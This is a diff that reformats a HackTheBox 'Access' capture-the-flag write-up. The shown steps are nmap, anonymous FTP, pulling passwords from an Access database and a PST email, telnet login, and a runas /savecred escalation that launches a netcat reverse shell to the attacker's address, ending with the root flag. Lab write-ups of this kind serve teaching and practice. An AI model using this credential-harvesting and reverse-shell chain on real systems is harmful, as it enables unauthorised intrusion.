@@ -1,10 +1,10 @@
+# Access
+## Recon
+```sh
+# ~/htb/access
+nmap -A 10.10.10.98
 
-
-```python
-# Initial recon
-!nmap -A 10.10.10.98
 ```
-
     Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-27 15:19 EST
     Nmap scan report for 10.10.10.98
     Host is up (0.041s latency).
@@ -13,11 +13,11 @@
     21/tcp open  ftp     Microsoft ftpd
     | ftp-anon: Anonymous FTP login allowed (FTP code 230)
     |_Can't get directory listing: PASV failed: 425 Cannot open data connection.
-    | ftp-syst: 
+    | ftp-syst:
     |_  SYST: Windows_NT
     23/tcp open  telnet?
     80/tcp open  http    Microsoft IIS httpd 7.5
-    | http-methods: 
+    | http-methods:
     |_  Potentially risky methods: TRACE
     |_http-server-header: Microsoft-IIS/7.5
     |_http-title: MegaCorp
@@ -29,22 +29,20 @@
     No exact OS matches for host (test conditions non-ideal).
     Network Distance: 2 hops
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-    
+
     TRACEROUTE (using port 21/tcp)
     HOP RTT      ADDRESS
     1   42.33 ms 10.10.14.1
     2   42.90 ms 10.10.10.98
-    
+
     OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 181.08 seconds
 
-
-
-```python
+```sh
 # Grab the main page for the HTTP server
-!curl -v 10.10.10.98
-```
+curl -v 10.10.10.98
 
+```
     * Expire in 0 ms for 6 (transfer 0x55b8715aec60)
     *   Trying 10.10.10.98...
     * TCP_NODELAY set
@@ -54,7 +52,7 @@
     > Host: 10.10.10.98
     > User-Agent: curl/7.64.0
     > Accept: */*
-    > 
+    >
     < HTTP/1.1 200 OK
     < Content-Type: text/html
     < Last-Modified: Thu, 23 Aug 2018 23:33:43 GMT
@@ -64,14 +62,14 @@
     < X-Powered-By: ASP.NET
     < Date: Wed, 27 Feb 2019 20:37:05 GMT
     < Content-Length: 391
-    < 
+    <
     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
     <html>
     <head>
     <title>MegaCorp</title>
     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
     </head>
-    
+
     <body>
     <div align="center">
       <p><strong><font size="5" face="Verdana, Arial, Helvetica, sans-serif">LON-MC6</font></strong> </p>
@@ -81,7 +79,10 @@
     </html>
     * Connection #0 to host 10.10.10.98 left intact
 
-root@kali:~/git/HackTheBox/access# ftp 10.10.10.98
+```sh
+ftp 10.10.10.98
+
+```
 Connected to 10.10.10.98.
 220 Microsoft FTP Service
 Name (10.10.10.98:root): anonymous
@@ -128,112 +129,117 @@ local: Access Control.zip remote: Access Control.zip
 ftp> quit
 221 Goodbye.
 
-```python
-!mv 'Access Control.zip' Access_Control.zip
+```sh
+mv 'Access Control.zip' Access_Control.zip
+unzip Access_Control.zip
+
 ```
-
-
-```python
-!unzip Access_Control.zip
-```
-
     Archive:  Access_Control.zip
        skipping: Access Control.pst      unsupported compression method 99
-
+```
 
 > Access_Control.zip is password protected.
 
-`Open 'backup.mdb' with Access`  
->Contains a bunch of tables. Potentially of interest: UserInfo, auth_user
+```
+Open 'backup.mdb' with Access
+```
+> Contains a bunch of tables. Potentially of interest: UserInfo, auth_user
 
-`Open 'UserInfo'`  
-> USERID	Badgenumber	SSN	name	Gender	TITLE	PAGER	BIRTHDAY	HIREDDAY	street	CITY	STATE	ZIP	OPHONE	FPHONE	VERIFICATIONMETHOD	DEFAULTDEPTID	SECURITYFLAGS	ATT	INLATE	OUTEARLY	OVERTIME	SEP	HOLIDAY	MINZU	PASSWORD	LUNCHDURATION	PHOTO	mverifypass	Notes	privilege	InheritDeptSch	InheritDeptSchClass	AutoSchPlan	MinAutoSchInterval	RegisterOT	InheritDeptRule	EMPRIVILEGE	CardNo	change_operator	change_time	create_operator	create_time	delete_operator	delete_time	status	lastname	AccGroup	TimeZones	identitycard	UTime	Education	OffDuty	DelTag	morecard_group_id	set_valid_time	acc_startdate	acc_enddate	birthplace	Political	contry	hiretype	email	firedate	isatt	homeaddress	emptype	bankcode1	bankcode2	isblacklist	Iuser1	Iuser2	Iuser3	Iuser4	Iuser5	Cuser1	Cuser2	Cuser3	Cuser4	Cuser5	Duser1	Duser2	Duser3	Duser4	Duser5	reserve	OfflineBeginDate	OfflineEndDate	carNo	carType	carBrand	carColor
+```
+Open 'UserInfo'
+```
+```
+USERID	Badgenumber	SSN	name	Gender	TITLE	PAGER	BIRTHDAY	HIREDDAY	street	CITY	STATE	ZIP	OPHONE	FPHONE	VERIFICATIONMETHOD	DEFAULTDEPTID	SECURITYFLAGS	ATT	INLATE	OUTEARLY	OVERTIME	SEP	HOLIDAY	MINZU	PASSWORD	LUNCHDURATION	PHOTO	mverifypass	Notes	privilege	InheritDeptSch	InheritDeptSchClass	AutoSchPlan	MinAutoSchInterval	RegisterOT	InheritDeptRule	EMPRIVILEGE	CardNo	change_operator	change_time	create_operator	create_time	delete_operator	delete_time	status	lastname	AccGroup	TimeZones	identitycard	UTime	Education	OffDuty	DelTag	morecard_group_id	set_valid_time	acc_startdate	acc_enddate	birthplace	Political	contry	hiretype	email	firedate	isatt	homeaddress	emptype	bankcode1	bankcode2	isblacklist	Iuser1	Iuser2	Iuser3	Iuser4	Iuser5	Cuser1	Cuser2	Cuser3	Cuser4	Cuser5	Duser1	Duser2	Duser3	Duser4	Duser5	reserve	OfflineBeginDate	OfflineEndDate	carNo	carType	carBrand	carColor
 1	538	0	John	M			3/25/2018 9:31:40 PM	4/10/2018 9:35:19 PM								47		1	0	1	1	1	1		020481	1				0	1	1	1	24	1	1	0								0	Carter	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
 2	511	0	Mark	M			5/16/2018 9:44:28 PM	8/10/2018 9:44:38 PM								49		1	0	1	1	1	1		010101	1				0	1	1	1	24	1	1	0								0	Smith	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
 3	502	0	Sunita	F			8/21/2018 9:44:49 PM	8/21/2018 9:46:50 PM								49		1	0	1	1	1	1		000000	1				0	1	1	1	24	1	1	0								0	Rahman	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
 4	505	0	Mary	M			8/18/2018 9:47:09 PM	8/21/2018 9:48:40 PM								48		1	0	1	1	1	1		666666	1				0	1	1	1	24	1	1	0								0	Jones	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
 5	510	0	Monica	F			1/2/2018 9:14:11 PM	8/22/2018 9:14:11 PM								50		1	0	1	1	1	1		123321	1				0	1	1	1	24	1	1	0								0	Nunes	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
-
-`Open 'auth_user'`  
-> id	username	password	Status	last_login	RoleID	Remark
-25	admin	admin	1	8/23/2018 9:11:47 PM	26	
-27	engineer	access4u@security	1	8/23/2018 9:13:36 PM	26	
-28	backup_admin	admin	1	8/23/2018 9:14:02 PM	26	
-
-
-```python
-!echo "engineer / access4u@security" >> creds.txt
 ```
 
-
-```python
-!7z x -paccess4u@security Access_Control.zip
+```
+Open 'auth_user'
+```
+```
+id	username	password	Status	last_login	RoleID	Remark
+25	admin	admin	1	8/23/2018 9:11:47 PM	26
+27	engineer	access4u@security	1	8/23/2018 9:13:36 PM	26
+28	backup_admin	admin	1	8/23/2018 9:14:02 PM	26
 ```
 
-    
+```bash
+echo "engineer / access4u@security" >> creds.txt
+```
+```bash
+cat creds.txt
+```
+```
+    engineer / access4u@security
+```
+
+```bash
+7z x -paccess4u@security Access_Control.zip
+```
+```
     7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
     p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Xeon(R) CPU E5-2670 0 @ 2.60GHz (206D7),ASM,AES-NI)
-    
+
     Scanning the drive for archives:
       0M Scan         1 file, 10870 bytes (11 KiB)
-    
+
     Extracting archive: Access_Control.zip
     --
     Path = Access_Control.zip
     Type = zip
     Physical Size = 10870
-    
+
       0%    Everything is Ok
-    
+
     Size:       271360
     Compressed: 10870
-
-
-
-```python
-!mv 'Access Control.pst' Access_Control.pst
 ```
 
-
-```python
-!lspst Access_Control.pst
+```bash
+mv 'Access Control.pst' Access_Control.pst
 ```
 
+```bash
+lspst Access_Control.pst
+```
+```
     Email	From: john@megacorp.com	Subject: MegaCorp Access Control System "security" account
-
-
-
-```python
-!readpst -S Access_Control.pst
 ```
 
+```bash
+readpst -S Access_Control.pst
+```
+```
     Opening PST file and indexes...
     Processing Folder "Deleted Items"
     	"Access Control" - 2 items done, 0 items skipped.
-
-
-
-```python
-!mv 'Access Control' Access_Control
 ```
 
 
-```python
-!ls -lahR Access_Control
+```bash
+mv 'Access Control' Access_Control
 ```
 
+```bash
+ls -lahR Access_Control
+```
+```
     Access_Control:
     total 12K
     drwxr-xr-x 2 root root 4.0K Feb 27 16:15 .
     drwxr-xr-x 4 root root 4.0K Feb 27 16:16 ..
     -rw-r--r-- 1 root root 3.0K Feb 27 16:15 2
-
-
-
-```python
-!cat Access_Control/2
 ```
 
+
+```bash
+cat Access_Control/2
+```
+```
     Status: RO
     From: john@megacorp.com <john@megacorp.com>
     Subject: MegaCorp Access Control System "security" account
@@ -242,31 +248,31 @@ ftp> quit
     MIME-Version: 1.0
     Content-Type: multipart/mixed;
     	boundary="--boundary-LibPST-iamunique-1009458489_-_-"
-    
-    
+
+
     ----boundary-LibPST-iamunique-1009458489_-_-
     Content-Type: multipart/alternative;
     	boundary="alt---boundary-LibPST-iamunique-1009458489_-_-"
-    
+
     --alt---boundary-LibPST-iamunique-1009458489_-_-
     Content-Type: text/plain; charset="utf-8"
-    
+
     Hi there,
-    
-     
-    
+
+
+
     The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
-    
-     
-    
+
+
+
     Regards,
-    
+
     John
-    
-    
+
+
     --alt---boundary-LibPST-iamunique-1009458489_-_-
     Content-Type: text/html; charset="us-ascii"
-    
+
     <html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
     /* Font Definitions */
     @font-face
@@ -317,32 +323,32 @@ ftp> quit
     <o:idmap v:ext="edit" data="1" />
     </o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
     --alt---boundary-LibPST-iamunique-1009458489_-_---
-    
+
     ----boundary-LibPST-iamunique-1009458489_-_---
-    
+```  
 
-
-
-```python
-!echo "security / 4Cc3ssC0ntr0ller" >> creds.txt
+```bash
+echo "security / 4Cc3ssC0ntr0ller" >> creds.txt
 ```
-
-
-```python
-!cat creds.txt
+```bash
+cat creds.txt
 ```
-
+```
     engineer / access4u@security
     security / 4Cc3ssC0ntr0ller
+```
 
-root@kali:~/git/HackTheBox/access# telnet 10.10.10.98
+```bash
+telnet 10.10.10.98
+```
+```
 Trying 10.10.10.98...
 Connected to 10.10.10.98.
 Escape character is '^]'.
-Welcome to Microsoft Telnet Service 
+Welcome to Microsoft Telnet Service
 
 login: security
-password: 
+password:
 
 *===============================================================
 Microsoft Telnet Server.
@@ -390,7 +396,7 @@ ff1f3b48913b213a31ff6756d2553d38
 C:\Users\security\Desktop>C:\Users\security>systeminfo
 
 Host Name:                 ACCESS
-OS Name:                   Microsoft Windows Server 2008 R2 Standard 
+OS Name:                   Microsoft Windows Server 2008 R2 Standard
 OS Version:                6.1.7600 N/A Build 7600
 OS Manufacturer:           Microsoft Corporation
 OS Configuration:          Standalone Server
@@ -581,42 +587,55 @@ Open the SQL Management Studio application located either here:
    "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"
 Or here:
    "C:\Program Files\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"
- 
+
 - When it opens the "Connect to Server" dialog, under "Server name:" type "LOCALHOST", "Authentication:" selected must be "SQL Server Authentication".
- 
+
    "Login:" = "sa"
    "Password:" = "htrcy@HXeryNJCTRHcnb45CJRY"
- 
+
 - Click "Connect", once connected click on the "Open File" icon, navigate to the folder where the scripts are saved (c:\temp\scripts).
 - Select each script in order of name by the first number in the name and run them in order e.g. "1_CREATE_SYSDBA.sql" then "2_ALTER_SERVER_ROLE.sql" then "3_SP_ATTACH_DB.sql" then "4_ALTER_AUTHORIZATION.sql"
 If the scripts begin from "2_*.sql" or "3_*.sql" it means the previous scripts ran fine, so begin from the lowest script number ascending.
 
-For the vbs scripts: 
+For the vbs scripts:
 - Go to windows Services and stop ALL SQL related services.
 - Open command prompt with elevated privileges (Administrator).
 - paste the following commands in command prompt for each script and click ENTER...
 	1. cmd.exe /c WScript.exe "c:\temp\scripts\SQLOpenFirewallPorts.vbs" "C:\Windows\system32" "c:\temp\logs\"
 	2. cmd.exe /c WScript.exe "c:\temp\scripts\SQLServerCfgPort.vbs" "C:\Windows\system32" "c:\temp\logs\" "NO_INSTANCES_FOUND"
 	3. cmd.exe /c WScript.exe "c:\temp\scripts\SetAccessRuleOnDirectory.vbs" "C:\Windows\system32" "c:\temp\logs\" "NT AUTHORITY\SYSTEM" "C:\\Portal\database"
-	4. Start up all SQL services again manually or run - cmd.exe /c WScript.exe "c:\temp\scripts\RestartServiceByDescriptionNameLike.vbs" "C:\Windows\system32" "c:\temp\logs\" "SQL Server (NO_INSTANCES_FOUND)" 
-
-```python
-!echo "sa / htrcy@HXeryNJCTRHcnb45CJRY" >> creds.txt
-!cat creds.txt
+	4. Start up all SQL services again manually or run - cmd.exe /c WScript.exe "c:\temp\scripts\RestartServiceByDescriptionNameLike.vbs" "C:\Windows\system32" "c:\temp\logs\" "SQL Server (NO_INSTANCES_FOUND)"
 ```
 
+```bash
+echo "sa / htrcy@HXeryNJCTRHcnb45CJRY" >> creds.txt
+cat creds.txt
+```
+```
     engineer / access4u@security
     security / 4Cc3ssC0ntr0ller
     sa / htrcy@HXeryNJCTRHcnb45CJRY
+```
 
+```
 C:\temp>cmdkey /list
-
+```
+```
 Currently stored credentials:
 
     Target: Domain:interactive=ACCESS\Administrator
                                                        Type: Domain Password
-    User: ACCESS\Administratorroot@kali:~/git/HackTheBox/access# nc -lvnp 80
-C:\temp>runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c c:\temp\nc.exe 10.10.14.17 80 -e cmd.exe"listening on [any] 80 ...
+    User: ACCESS\Administrator
+```
+
+```bash
+nc -lvnp 80
+```
+```
+C:\temp>runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c c:\temp\nc.exe 10.10.14.17 80 -e cmd.exe"
+```
+```
+listening on [any] 80 ...
 connect to [10.10.14.17] from (UNKNOWN) [10.10.10.98] 49181
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
@@ -627,3 +646,4 @@ cd ../../Users/Administrator/Desktop
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 6e1586cc7ab230a8d297e8f933d904cf
+```
